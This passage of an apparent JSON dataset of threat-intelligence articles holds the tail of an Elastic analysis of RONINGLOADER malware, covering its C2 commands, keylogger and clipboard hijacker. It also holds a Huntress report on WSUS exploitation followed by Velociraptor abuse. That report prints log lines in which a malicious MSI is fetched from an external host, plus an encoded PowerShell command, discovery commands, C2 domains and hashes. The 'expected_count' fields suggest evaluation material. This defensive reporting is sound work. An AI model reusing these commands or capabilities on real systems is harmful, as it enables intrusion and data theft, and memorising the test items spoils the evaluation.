\"\u72d0\u72f8\u7cfb\u5217\" (MetaMask) or registry \"ZU\" (crypto related tracking) // +0x284 uint8_t is_admin; // 1 if running with admin rights // +0x285 char data[?]; // +0x305 uint8_t telegram_installed; // 1 if Telegram installed // +0x306 uint8_t telegram_running; // 1 if Telegram.exe running // +0x307 // (padding to 0x308 bytes) }; C2 commands Request messages sent from the C2 server to the implant follow the structure: struct C2_to_implant_msg { uint32_t total_message_len; uint32_t RC4_key; char encrypted_command_id; uint8_t encrypted_command_args; }; The implant decrypts C2 messages through the following formula: RC4_decrypt(ASCII(decimal(RC4_key)), encrypted_command_id || command) Below is a list of available commands that, for the most part, remain the same as 2 years ago: Command ID Description 0 ExitWindowsEx via a supplied EXIT_WINDOWS_FLAGS 1 Terminate implant gracefully 2 Set registry key Enable to False to terminate & disable implant persistently 3 Set registry key Remark for custom victim renaming (default value: hostname) 4 Set registry key ZU for MetaMask / crypto-related tagging 5 Clear Windows Event logs (Application, Security, System) 6 Set additional custom tags when client beacons 7 Download and execute file via supplied URL 9 ShellExecute (visible window) 10 ShellExecute (hidden window) 112 Get clipboard data 113 Set clipboard data 125 ShellExecute cmd.exe with command parameters (hidden window) 126 Execute payload by dropping to disk or reflectively load and execute PluginMe export 128 First option - open a new session with a supplied C2 domain, port, and beacon interval. Second option - set registry key CopyC to update C2 domain and port permanently. Stored encrypted via Base64Encode(XOR(C2_domain_and_port, 0x5)) . 241 Check if Telegram is installed and/or running 243 Configure Clipboard Hijacker 101 , 127 , 236 , [...] Custom shellcode injection into svchost.exe using WTS session token impersonation, falling back to CREATE_SUSPENDED process injection via CreateRemoteThread Analyst note: There are multiple command IDs that point to the same command. We used an ellipsis to identify when this was observed. System Logger In addition to the C2 commands, the implant implements a keystroke, clipboard, and active-window logger. Captured data is written to %ProgramData%\\microsoft.dotnet.common.log and can be enabled or disabled via a registry key at HKEY_CURRENT_USER\\offlinekey\\open ( 1 to enable, 0 to disable). The log file implements automatic rotation, deleting itself when it exceeds 50 MB to avoid detection through excessive disk usage. The code snippet below demonstrates the initialization routine that implements log rotation and configures a DirectInput8 interface to acquire the keyboard device for event capture, followed by the keyboard event retrieval logic. The malware then enters a monitoring loop to capture three categories of information. First, it monitors the clipboard using OpenClipboard and GetClipboardData , logging any changes to text content with the prefix [\u526a\u5207\u677f:] . Second, it tracks window focus changes via GetForegroundWindow , logging the active window title and timestamp with the prefixes [\u6807\u9898:] and [\u65f6\u95f4:] , respectively, whenever the user switches applications. Third, it retrieves buffered keyboard events from the DirectInput8 device (up to 60 events per poll) and translates them into readable text through a character mapping table, prepending the results with a prefix [\u5185\u5bb9:] . Clipboard Hijacker The malware also implements a clipboard hijacker that is remotely configured through C2 command ID 243. It monitors clipboard changes and performs search-and-replace operations on captured text, substituting attacker-defined strings with replacement values. Configuration parameters are stored in the registry under HKEY_CURRENT_USER\\offlinekey with keys clipboard (enable/disable feature), charac (search string), characLen (search length), and newcharac (replacement string). It registers a window class named ClipboardListener_Class_Toggle and creates a hidden window titled ClipboardMonitor to receive clipboard change notifications. The window procedure handles WM_CLIPBOARDUPDATE ( 0x31D ) messages by verifying clipboard sequence numbers with GetClipboardSequenceNumber to detect genuine changes, then invoking the core manipulation routine, which swaps the clipboard content via EmptyClipboard and SetClipboardData . Malware and MITRE ATT&CK Elastic uses the MITRE ATT&CK framework to document common tactics, techniques, and procedures that advanced persistent threats use against enterprise networks. Tactics Tactics represent the why of a technique or sub-technique. It is the adversary\u2019s tactical goal: the reason for performing an action. Execution Persistence Privilege Escalation Defense Evasion Credential Access Discovery Collection Command and Control Techniques Techniques represent how an adversary achieves a tactical goal by performing an action. Command and Scripting Interpreter: Windows Command Shell System Services: Service Execution Create or Modify System Process: Windows Service Abuse Elevation Control Mechanism: Bypass User Account Control Access Token Manipulation Impair Defenses: Disable or Modify Tools Impair Defenses: Disable or Modify System Firewall Indicator Removal: Clear Windows Event Logs Hijack Execution Flow: DLL Side-Loading Process Injection Masquerading: Match Legitimate Name or Location Modify Registry Subvert Trust Controls: Code Signing Policy Modification Input Capture: Keylogging Clipboard Data Process Discovery System Information Discovery System Owner/User Discovery Software Discovery: Security Software Discovery Non-Application Layer Protocol Encrypted Channel: Symmetric Cryptography Mitigations Detection Potential Evasion via ClipUp Execution Suspicious Remote Memory Allocation Potential Suspended Process Code Injection Remote Memory Write to Trusted Target Process Remote Process Memory Write by Low Reputation Module Process Memory Write to a Non Child Process Unbacked Shellcode from Unsigned Module UAC Bypass Attempt via WOW64 Logger DLL Side-Loading Network Connect API from Unbacked Memory Rundll32 or Regsvr32 Loaded a DLL from Unbacked Memory Network Module Loaded from Suspicious Unbacked Memory YARA Elastic Security has created YARA rules to identify this activity. Below are YARA rules to identify RONINGLOADER and the final implant: Windows.Trojan.RoningLoader Windows.Trojan.DragonBreath Observations The following observables were discussed in this research. Observable Type Name Reference da2c58308e860e57df4c46465fd1cfc68d41e8699b4871e9a9be3c434283d50b SHA-256 klklznuah.msi Initial MSI installer 82794015e2b40cc6e02d3c1d50241465c0cf2c2e4f0a7a2a8f880edaee203724 SHA-256 Snieoatwtregoable.exe Malicious installer unpacked from initial installer c65170be2bf4f0bd71b9044592c063eaa82f3d43fcbd8a81e30a959bcaad8ae5 SHA-256 Snieoatwtregoable.dll Stage 1 - loader for stage 2 2515b546125d20013237aeadec5873e6438ada611347035358059a77a32c54f5 SHA-256 ollama.sys Stage 2 - driver for process termination 1613a913d0384cbb958e9a8d6b00fffaf77c27d348ebc7886d6c563a6f22f2b7 SHA-256 tp.png Stage 2 - encrypted core payload 395f835731d25803a791db984062dd5cfdcade6f95cc5d0f68d359af32f6258d SHA-256 1.bat Stage 2 - UAC bypass script 1c1528b546aa29be6614707cbe408cb4b46e8ed05bf3fe6b388b9f22a4ee37e2 SHA-256 fhq.bat Stage 2 - script to block networking for AV processes 4d5beb8efd4ade583c8ff730609f142550e8ed14c251bae1097c35a756ed39e6 SHA-256 1.dll Stage 2 - AV processes termination 96f401b80d3319f8285fa2bb7f0d66ca9055d349c044b78c27e339bcfb07cdf0 SHA-256 {31351756-3F24-4963-8380-4E7602335AAE}.cip Stage 2 - WDAC policy 33b494eaaa6d7ed75eec74f8c8c866b6c42f59ca72b8517b3d4752c3313e617c SHA-256 goldendays.dll Stage 3 - entry point fc63f5dfc93f2358f4cba18cbdf99578fff5dac4cdd2de193a21f6041a0e01bc SHA-256 trustinstaller.bin Stage 3 - loader for Enpug.bin fd4dd9904549c6655465331921a28330ad2b9ff1c99eb993edf2252001f1d107 SHA-256 Enpug.bin Stage 3 - loader for final payload 3dd470e85fe77cd847ca59d1d08ec8ccebe9bd73fd2cf074c29d87ca2fd24e33 SHA-256 6uf9i.exe Stage 4 - final payload qaqkongtiao[.]com domain-name Stage 4 - final payload C2 References The following were referenced throughout the above research: https://nsis.sourceforge.io/Main_Page https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service https://github.com/Jemmy1228/HookSigntool https://www.safebreach.com/blog/process-injection-using-windows-thread-pools/ https://hijacklibs.net/entries/microsoft/built-in/wow64log.html https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html https://github.com/TwoSevenOneT/EDR-Freeze/blob/ceffd5ea7b813b356c77d469561dbb5ee45aeb24/PPLHelp.cpp#L43 https://news.sophos.com/en-us/2023/05/03/doubled-dll-sideloading-dragon-breath/ https://ti.qianxin.com/blog/articles/operation-dragon-breath-%28apt-q-27%29-dimensionality-reduction-blow-to-the-gambling-industry/ https://github.com/sin5678/gh0st Jump to section Introduction Key takeaways Discovery RONINGLOADER code analysis Stage 1 Stage 2 - tp.png AV process termination via injected remote process AV process termination Embedded archives Batch scripts to bypass UAC and AV networking Show more Elastic Security Labs Newsletter Sign Up Share this article X Facebook LinkedIn Reddit Sitemap Elastic.co @elasticseclabs \u00a9 2026 . Elasticsearch B.V. All Rights Reserved.",
    "expected_count": 3
  },
  {
    "url": "https://www.huntress.com/blog/velociraptor-misuse-part-one-wsus-up",
    "title": "Velociraptor WSUS Exploitation, Pt. I: WSUS-Up? | Huntress",
    "content": "Velociraptor WSUS Exploitation, Pt. I: WSUS-Up? | Huntress Huntress Acquires Inside Agent: A New Era for Identity Protection Portal Login Support Contact Search Search Products Products Platform Overview Managed EDR Get full endpoint visibility, detection, and response Managed EDR Get full endpoint visibility, detection, and response Managed ITDR Protect your Microsoft 365 identities and email environments. Managed ITDR Protect your Microsoft 365 identities and email environments. Managed SIEM Managed threat response and robust compliance support at a predictable price. Managed SIEM Managed threat response and robust compliance support at a predictable price. Managed Security Awareness Training Empower your teams with science-backed security awareness training. Managed Security Awareness Training Empower your teams with science-backed security awareness training. Integrations Integrations Support Documentation Support Documentation See Huntress in Action Quickly deploy and manage real-time protection for endpoints, email, and employees - all from a single dashboard. Book a Demo See Huntress in Action Quickly deploy and manage real-time protection for endpoints, email, and employees - all from a single dashboard. Solutions Solutions Threats We Stop Phishing Phishing Business Email Compromise Business Email Compromise Ransomware Ransomware View All View All Industries We Serve Education Education Financial Services Financial Services State and Local Government State and Local Government Healthcare Healthcare Law Firms Law Firms Manufacturing Manufacturing Utilities Utilities View All View All Tailored Solutions MSPs MSPs Resellers Resellers SMBs SMBs Compliance Compliance Healthcare Cybersecurity Success Kit Everything you need to keep your patients safe and your organization running smoothly. Healthcare Cybersecurity Success Kit Everything you need to keep your patients safe and your organization running smoothly. Pricing Resources Resources Community Series The Product Lab Shape the next big thing in cybersecurity together. The Product Lab Shape the next big thing in cybersecurity together. Fireside Chat Real people. Real perspectives. Better conversations. Fireside Chat Real people. Real perspectives. Better conversations. Tradecraft Tuesday No products, no pitches \u2013 just tradecraft. Tradecraft Tuesday No products, no pitches \u2013 just tradecraft. Resources Upcoming Events Upcoming Events eBooks eBooks On-Demand Webinars On-Demand Webinars Videos Videos Whitepapers Whitepapers Datasheets Datasheets Cybersecurity Education Cybersecurity 101 Cybersecurity 101 Cybersecurity Guides Cybersecurity Guides Threat Library Threat Library Real Tradecraft, Real Results Real Tradecraft, Real Results The Huntress Blog Huntress Lands on the Microsoft Marketplace Huntress Lands on the Microsoft Marketplace How Huntress & DEFCERT Are Streamlining CMMC Assessment Prep How Huntress & DEFCERT Are Streamlining CMMC Assessment Prep Live Hacking Into Microsoft 365 with Kyle Hanslovan Live Hacking Into Microsoft 365 with Kyle Hanslovan Why Huntress Why Huntress Why Huntress Go beyond AI in the fight against today\u2019s hackers with Huntress Managed EDR purpose-built for your needs Why Huntress Go beyond AI in the fight against today\u2019s hackers with Huntress Managed EDR purpose-built for your needs The Huntress SOC 24/7 Security Operations Center The Huntress SOC 24/7 Security Operations Center Reviews Why businesses of all sizes trust Huntress to defend their assets Reviews Why businesses of all sizes trust Huntress to defend their assets Case Studies Learn directly from our partners how Huntress has helped them Case Studies Learn directly from our partners how Huntress has helped them Community Get in touch with the Huntress Community team Community Get in touch with the Huntress Community team Compare Huntress Bitdefender Bitdefender Blackpoint Blackpoint Breach Secure Now! Breach Secure Now! Crowdstrike Crowdstrike Datto Datto SentinelOne SentinelOne Sophos Sophos Compare All Compare All Partners Partners HUNTRESS HUB Login to access top-notch marketing resources, tools, and training. Partner Portal Login HUNTRESS HUB Login to access top-notch marketing resources, tools, and training. MSPs Join our partner community to deliver expert-led managed security. MSPs Join our partner community to deliver expert-led managed security. Resellers Partner program designed to grow your cybersecurity business. Resellers Partner program designed to grow your cybersecurity business. Company Company Press Release Huntress Announces Collaboration with Microsoft to Strengthen Cybersecurity for Businesses of All Sizes Press Release Huntress Announces Collaboration with Microsoft to Strengthen Cybersecurity for Businesses of All Sizes Our Story We're on a mission to shatter the barriers to enterprise-level security. Our Story We're on a mission to shatter the barriers to enterprise-level security. Newsroom Explore press releases, news articles, media interviews and more. Newsroom Explore press releases, news articles, media interviews and more. Meet the Team Founded by former NSA Cyber Operators. Backed by security researchers. Meet the Team Founded by former NSA Cyber Operators. Backed by security researchers. Careers Ready to shake up the cybersecurity world? Join the hunt. Careers Ready to shake up the cybersecurity world? Join the hunt. Awards Awards Contact Us Contact Us Portal Login Support Contact Search Get a Demo Free Trial Portal Login Support Contact Search Search Get a Demo Free Trial Home Blog Velociraptor Misuse, Pt. I: WSUS-Up? Published: November 20, 2025 Velociraptor Misuse, Pt. I: WSUS-Up? By: Lindsey O'Donnell-Welch Harlan Carvey Acknowledgments: Special thanks to Ben Folland for his contributions to this investigation and writeup. In November, Huntress analysts detected an incident where threat actors likely exploited a recently patched remote code execution vulnerability in Windows Server Update Services (WSUS). After gaining initial access via exploitation of the flaw (CVE-2025-59287), the actors then installed Velociraptor, a legitimate, open source tool, which was used for C2 of the endpoint. Velociraptor is a digital forensics and incident response (DFIR) tool that enables teams to quickly collect and analyze artifacts from across a network, giving them a better understanding of security incidents. Threat actors have been abusing the tool in attacks, specifically to set up communications back to command-and-control (C2) servers. The Huntress Security Operations Center (SOC) first observed the misuse of Velociraptor during November 2024. However, more recently in 2025 there\u2019s been a significant uptick in the past three months of incidents involving the use of the Velociraptor to facilitate remote access into the compromised endpoint. In part one of this two-part series, we will break down a recent incident we observed where threat actors exploited WSUS before deploying Velociraptor. In part two, we will discuss the evolution of incidents over the past few months we\u2019ve seen that abuse the tool. WSUS exploitation On November 12, 2025, we observed the deployment of Velociraptor by threat actors after they had gained initial access through exploitation of a flaw in WSUS (Microsoft\u2019s centralized update distribution service for IT administrators). This deserialization issue has previously been exploited by threat actors targeting vulnerable WSUS instances exposed publicly on their default ports; as of October 23, a patch is available from Microsoft. The exploitation of WSUS is interesting when compared to previous incidents that have involved Velociraptor. Other researchers have recently publicly documented how threat actors are abusing the tool in attacks. For example, the Cisco Talos team in October found Velociraptor activity that they attributed with medium confidence to Storm-2603. While the researchers did not observe the actor\u2019s initial access in this incident, they said the vector was likely attributed to SharePoint vulnerabilities known as ToolShell, due to the impacted organization\u2019s exposure to ToolShell and the link to Storm-2603. In the incident we saw, the Windows Event Log shows the threat actor compromising WSUSService.exe before running the Windows installer (as seen via a Service Control Manager/7036 message stating Windows Installer,running ) and then installing a malicious MSI package from s3[.]wasabisys[.]com . Figure 1 illustrates the results of searching for the domain on VirusTotal. Figure 1: VirusTotal search for the domain wasabisys[.]com linked to the malicious MSI package As seen in the Windows Event Log records below, the threat actor then installed Velociraptor, which was configured to communicate with the endpoint update[.]githubtestbak[.]workers[.]dev . MsiInstaller/1040;https://s3.wasabisys.com/kiessler/v4.msi,3348,(NULL),(NULL),(NULL),(NULL), Service Control Manager/7045;Velociraptor Service,\"C:\\Program Files\\Velociraptor\\Velociraptor.exe\" --config \"C:\\Program Files\\Velociraptor\\/client.config.yaml\" service run ,user mode service,auto start,LocalSystem Service Control Manager/7036;Velociraptor Service,running Velociraptor/1;Starting service Velociraptor MsiInstaller/11707;Product: Velociraptor -- Installation completed successfully.,(NULL),(NULL),(NULL),(NULL),(NULL), Velociraptor was installed via the following binary path: Velociraptor/1000;\"Velociraptor startup ARGV: [\"\"C:\\Program Files\\Velociraptor\\Velociraptor.exe\"\",\"\"--config\"\",\"\"C:\\Program Files\\Velociraptor\\/client.config.yaml\"\",\"\"service\"\",\"\"run\"\"],\" During the investigation into the incident, we found that even though the first attempt to install Velociraptor succeeded, there were two more subsequent attempts to run the same command to install the open source tool from the same location. After the threat actor installed Velociraptor, we observed a number of base64-encoded PowerShell commands, which were child processes of Velociraptor.exe, such as the following: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Unrestricted -encodedCommand cQB1AHMAZQByAA== Each of the observed PowerShell commands varied only in the encoded commands; the command line switches and their positions in the command line were consistent across all commands. These commands launched a series of discovery queries, allowing the threat actor to gather information about users, running services, configurations, and more. \"C:\\Windows\\system32\\net.exe\" group \"domain computers\" /do \"C:\\Windows\\system32\\quser.exe\" \"C:\\Windows\\system32\\setspn.exe\" -Q VeeamBackupSVC/* \"C:\\Windows\\system32\\ipconfig.exe\" /al Figure 2: EDR signals showing the threat actor installing an MSI package, running Velociraptor, and performing discovery commands At this point, the threat actor\u2019s activity was contained by Huntress SOC analysts. Conclusion Velociraptor is only the latest legitimate tool that threat actors are abusing. While this is specifically for incident response, many of the tools that have previously been misused in attacks include dual-use penetration testing frameworks, such as Cobalt Strike, Mimikatz, Metasploit, and PowerSploit, as highlighted in the Huntress 2025 Cyber Threat Report . We\u2019ve seen threat actors use legitimate tools long enough to know that Velociraptor won\u2019t be the first dual-use, open-source tool that will pop up in attacks - nor will it be the last. However, by closely tracking the behavior in incidents that involve Velociraptor, we can get a better understanding of how threat actors are deploying these tools in victim environments. Huntress has seen Velociraptor in a number of other incidents over the past few months. For an additional deep view and insights into the misuse of the tool, stay tuned for part 2 of this blog series. Indicators of Compromise (IOCs) Item Description s3[.]wasabisys[.]com Domain from which MSI package was retrieved update[.]githubtestbak[.]workers[.]dev Velociraptor C2 Categories Cybersecurity Education Summarize this post ChatGPT Claude Perplexity Google AI See Huntress in action Our platform combines a suite of powerful managed detection and response tools for endpoints and Microsoft 365 identities, science-backed security awareness training, and the expertise of our 24/7 Security Operations Center (SOC). Book a Demo Share You Might Also Like CMMC Final Rule: What DoD Subs Need to Know The DoD's CMMC final rule is here. Learn what it means for subcontractors, the new timeline, and how to prepare for your Level 2 audit to stay competitive. Learn More #ShadyHacks with Kyle Hanslovan Learn More The Best Way to Prepare for the Worst: Incident Response Planning for Decision Makers Learn More Sign Up for Huntress Updates Get insider access to Huntress tradecraft, killer events, and the freshest blog updates. Work Email* Privacy \u2022 Terms Submit By submitting this form, you accept our Terms of Service & Privacy Policy Thank you! Your submission has been received! Oops! Something went wrong while submitting the form. Platform Huntress Managed Security Platform Managed EDR Managed EDR for macOS Managed EDR for Linux Managed ITDR Managed SIEM Managed Security Awareness Training Book a Demo Solutions Phishing Compliance Business Email Compromise Education Finance Healthcare Manufacturing State & Local Government Why Huntress? Managed Service Providers Resellers IT & Security Teams 24/7 SOC Case Studies Resources Blog Resource Center Cybersecurity 101 Upcoming Events Support Documentation About Our Company Leadership News & Press Careers Contact Us Protecting 215k+ customers like you with enterprise-grade protection. Privacy Policy Cookie Policy Terms of Use Cookie Consent \u00a9 2025 Huntress All Rights Reserved. Join the Hunt Get insider access to Huntress tradecraft, killer events, and the freshest blog updates. Email Sign Up By submitting this form, you accept our Terms of Service & Privacy Policy",
    "filtered_content": "Velociraptor WSUS Exploitation, Pt. I: WSUS-Up? | Huntress Huntress Acquires Inside Agent: A New Era for Identity Protection Portal Login Support Contact Search Search Products Products Platform Overview Managed EDR Get full endpoint visibility, detection, and response Managed EDR Get full endpoint visibility, detection, and response Managed ITDR Protect your Microsoft 365 identities and email environments. Managed ITDR Protect your Microsoft 365 identities and email environments. Managed SIEM Managed threat response and robust compliance support at a predictable price. Managed SIEM Managed threat response and robust compliance support at a predictable price. Managed Security Awareness Training Empower your teams with science-backed security awareness training. Managed Security Awareness Training Empower your teams with science-backed security awareness training. Integrations Integrations Support Documentation Support Documentation See Huntress in Action Quickly deploy and manage real-time protection for endpoints, email, and employees - all from a single dashboard. Book a Demo See Huntress in Action Quickly deploy and manage real-time protection for endpoints, email, and employees - all from a single dashboard. Solutions Solutions Threats We Stop Phishing Phishing Business Email Compromise Business Email Compromise Ransomware Ransomware View All View All Industries We Serve Education Education Financial Services Financial Services State and Local Government State and Local Government Healthcare Healthcare Law Firms Law Firms Manufacturing Manufacturing Utilities Utilities View All View All Tailored Solutions MSPs MSPs Resellers Resellers SMBs SMBs Compliance Compliance Healthcare Cybersecurity Success Kit Everything you need to keep your patients safe and your organization running smoothly. Healthcare Cybersecurity Success Kit Everything you need to keep your patients safe and your organization running smoothly. Pricing Resources Resources Community Series The Product Lab Shape the next big thing in cybersecurity together. The Product Lab Shape the next big thing in cybersecurity together. Fireside Chat Real people. Real perspectives. Better conversations. Fireside Chat Real people. Real perspectives. Better conversations. Tradecraft Tuesday No products, no pitches \u2013 just tradecraft. Tradecraft Tuesday No products, no pitches \u2013 just tradecraft. Resources Upcoming Events Upcoming Events eBooks eBooks On-Demand Webinars On-Demand Webinars Videos Videos Whitepapers Whitepapers Datasheets Datasheets Cybersecurity Education Cybersecurity 101 Cybersecurity 101 Cybersecurity Guides Cybersecurity Guides Threat Library Threat Library Real Tradecraft, Real Results Real Tradecraft, Real Results The Huntress Blog Huntress Lands on the Microsoft Marketplace Huntress Lands on the Microsoft Marketplace How Huntress & DEFCERT Are Streamlining CMMC Assessment Prep How Huntress & DEFCERT Are Streamlining CMMC Assessment Prep Live Hacking Into Microsoft 365 with Kyle Hanslovan Live Hacking Into Microsoft 365 with Kyle Hanslovan Why Huntress Why Huntress Why Huntress Go beyond AI in the fight against today\u2019s hackers with Huntress Managed EDR purpose-built for your needs Why Huntress Go beyond AI in the fight against today\u2019s hackers with Huntress Managed EDR purpose-built for your needs The Huntress SOC 24/7 Security Operations Center The Huntress SOC 24/7 Security Operations Center Reviews Why businesses of all sizes trust Huntress to defend their assets Reviews Why businesses of all sizes trust Huntress to defend their assets Case Studies Learn directly from our partners how Huntress has helped them Case Studies Learn directly from our partners how Huntress has helped them Community Get in touch with the Huntress Community team Community Get in touch with the Huntress Community team Compare Huntress Bitdefender Bitdefender Blackpoint Blackpoint Breach Secure Now! Breach Secure Now! Crowdstrike Crowdstrike Datto Datto SentinelOne SentinelOne Sophos Sophos Compare All Compare All Partners Partners HUNTRESS HUB Login to access top-notch marketing resources, tools, and training. Partner Portal Login HUNTRESS HUB Login to access top-notch marketing resources, tools, and training. MSPs Join our partner community to deliver expert-led managed security. MSPs Join our partner community to deliver expert-led managed security. Resellers Partner program designed to grow your cybersecurity business. Resellers Partner program designed to grow your cybersecurity business. Company Company Press Release Huntress Announces Collaboration with Microsoft to Strengthen Cybersecurity for Businesses of All Sizes Press Release Huntress Announces Collaboration with Microsoft to Strengthen Cybersecurity for Businesses of All Sizes Our Story We're on a mission to shatter the barriers to enterprise-level security. Our Story We're on a mission to shatter the barriers to enterprise-level security. Newsroom Explore press releases, news articles, media interviews and more. Newsroom Explore press releases, news articles, media interviews and more. Meet the Team Founded by former NSA Cyber Operators. Backed by security researchers. Meet the Team Founded by former NSA Cyber Operators. Backed by security researchers. Careers Ready to shake up the cybersecurity world? Join the hunt. Careers Ready to shake up the cybersecurity world? Join the hunt. Awards Awards Contact Us Contact Us Portal Login Support Contact Search Get a Demo Free Trial Portal Login Support Contact Search Search Get a Demo Free Trial Home Blog Velociraptor Misuse, Pt. I: WSUS-Up? Published: November 20, 2025 Velociraptor Misuse, Pt. I: WSUS-Up? By: Lindsey O'Donnell-Welch Harlan Carvey Acknowledgments: Special thanks to Ben Folland for his contributions to this investigation and writeup. In November, Huntress analysts detected an incident where threat actors likely exploited a recently patched remote code execution vulnerability in Windows Server Update Services (WSUS). After gaining initial access via exploitation of the flaw (CVE-2025-59287), the actors then installed Velociraptor, a legitimate, open source tool, which was used for C2 of the endpoint. Velociraptor is a digital forensics and incident response (DFIR) tool that enables teams to quickly collect and analyze artifacts from across a network, giving them a better understanding of security incidents. Threat actors have been abusing the tool in attacks, specifically to set up communications back to command-and-control (C2) servers. The Huntress Security Operations Center (SOC) first observed the misuse of Velociraptor during November 2024. However, more recently in 2025 there\u2019s been a significant uptick in the past three months of incidents involving the use of the Velociraptor to facilitate remote access into the compromised endpoint. In part one of this two-part series, we will break down a recent incident we observed where threat actors exploited WSUS before deploying Velociraptor. In part two, we will discuss the evolution of incidents over the past few months we\u2019ve seen that abuse the tool. WSUS exploitation On November 12, 2025, we observed the deployment of Velociraptor by threat actors after they had gained initial access through exploitation of a flaw in WSUS (Microsoft\u2019s centralized update distribution service for IT administrators). This deserialization issue has previously been exploited by threat actors targeting vulnerable WSUS instances exposed publicly on their default ports; as of October 23, a patch is available from Microsoft. The exploitation of WSUS is interesting when compared to previous incidents that have involved Velociraptor. Other researchers have recently publicly documented how threat actors are abusing the tool in attacks. For example, the Cisco Talos team in October found Velociraptor activity that they attributed with medium confidence to Storm-2603. While the researchers did not observe the actor\u2019s initial access in this incident, they said the vector was likely attributed to SharePoint vulnerabilities known as ToolShell, due to the impacted organization\u2019s exposure to ToolShell and the link to Storm-2603. In the incident we saw, the Windows Event Log shows the threat actor compromising WSUSService.exe before running the Windows installer (as seen via a Service Control Manager/7036 message stating Windows Installer,running ) and then installing a malicious MSI package from s3[.]wasabisys[.]com . Figure 1 illustrates the results of searching for the domain on VirusTotal. Figure 1: VirusTotal search for the domain wasabisys[.]com linked to the malicious MSI package As seen in the Windows Event Log records below, the threat actor then installed Velociraptor, which was configured to communicate with the endpoint update[.]githubtestbak[.]workers[.]dev . MsiInstaller/1040;https://s3.wasabisys.com/kiessler/v4.msi,3348,(NULL),(NULL),(NULL),(NULL), Service Control Manager/7045;Velociraptor Service,\"C:\\Program Files\\Velociraptor\\Velociraptor.exe\" --config \"C:\\Program Files\\Velociraptor\\/client.config.yaml\" service run ,user mode service,auto start,LocalSystem Service Control Manager/7036;Velociraptor Service,running Velociraptor/1;Starting service Velociraptor MsiInstaller/11707;Product: Velociraptor -- Installation completed successfully.,(NULL),(NULL),(NULL),(NULL),(NULL), Velociraptor was installed via the following binary path: Velociraptor/1000;\"Velociraptor startup ARGV: [\"\"C:\\Program Files\\Velociraptor\\Velociraptor.exe\"\",\"\"--config\"\",\"\"C:\\Program Files\\Velociraptor\\/client.config.yaml\"\",\"\"service\"\",\"\"run\"\"],\" During the investigation into the incident, we found that even though the first attempt to install Velociraptor succeeded, there were two more subsequent attempts to run the same command to install the open source tool from the same location. After the threat actor installed Velociraptor, we observed a number of base64-encoded PowerShell commands, which were child processes of Velociraptor.exe, such as the following: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Unrestricted -encodedCommand cQB1AHMAZQByAA== Each of the observed PowerShell commands varied only in the encoded commands; the command line switches and their positions in the command line were consistent across all commands. These commands launched a series of discovery queries, allowing the threat actor to gather information about users, running services, configurations, and more. \"C:\\Windows\\system32\\net.exe\" group \"domain computers\" /do \"C:\\Windows\\system32\\quser.exe\" \"C:\\Windows\\system32\\setspn.exe\" -Q VeeamBackupSVC/* \"C:\\Windows\\system32\\ipconfig.exe\" /al Figure 2: EDR signals showing the threat actor installing an MSI package, running Velociraptor, and performing discovery commands At this point, the threat actor\u2019s activity was contained by Huntress SOC analysts. Conclusion Velociraptor is only the latest legitimate tool that threat actors are abusing. While this is specifically for incident response, many of the tools that have previously been misused in attacks include dual-use penetration testing frameworks, such as Cobalt Strike, Mimikatz, Metasploit, and PowerSploit, as highlighted in the Huntress 2025 Cyber Threat Report . We\u2019ve seen threat actors use legitimate tools long enough to know that Velociraptor won\u2019t be the first dual-use, open-source tool that will pop up in attacks - nor will it be the last. However, by closely tracking the behavior in incidents that involve Velociraptor, we can get a better understanding of how threat actors are deploying these tools in victim environments. Huntress has seen Velociraptor in a number of other incidents over the past few months. For an additional deep view and insights into the misuse of the tool, stay tuned for part 2 of this blog series. Indicators of Compromise (IOCs) Item Description s3[.]wasabisys[.]com Domain from which MSI package was retrieved update[.]githubtestbak[.]workers[.]dev Velociraptor C2 Categories Cybersecurity Education Summarize this post ChatGPT Claude Perplexity Google AI See Huntress in action Our platform combines a suite of powerful managed detection and response tools for endpoints and Microsoft 365 identities, science-backed security awareness training, and the expertise of our 24/7 Security Operations Center (SOC). Book a Demo Share You Might Also Like CMMC Final Rule: What DoD Subs Need to Know The DoD's CMMC final rule is here. Learn what it means for subcontractors, the new timeline, and how to prepare for your Level 2 audit to stay competitive. Learn More #ShadyHacks with Kyle Hanslovan Learn More The Best Way to Prepare for the Worst: Incident Response Planning for Decision Makers Learn More Sign Up for Huntress Updates Get insider access to Huntress tradecraft, killer events, and the freshest blog updates. Work Email* Privacy \u2022 Terms Submit By submitting this form, you accept our Terms of Service & Privacy Policy Thank you! Your submission has been received! Oops! Something went wrong while submitting the form. Platform Huntress Managed Security Platform Managed EDR Managed EDR for macOS Managed EDR for Linux Managed ITDR Managed SIEM Managed Security Awareness Training Book a Demo Solutions Phishing Compliance Business Email Compromise Education Finance Healthcare Manufacturing State & Local Government Why Huntress? Managed Service Providers Resellers IT & Security Teams 24/7 SOC Case Studies Resources Blog Resource Center Cybersecurity 101 Upcoming Events Support Documentation About Our Company Leadership News & Press Careers Contact Us Protecting 215k+ customers like you with enterprise-grade protection. Privacy Policy Cookie Policy Terms of Use Cookie Consent \u00a9 2025 Huntress All Rights Reserved. Join the Hunt Get insider access to Huntress tradecraft, killer events, and the freshest blog updates. Email Sign Up By submitting this form, you accept our Terms of Service & Privacy Policy",
    "expected_count": 5
  }
]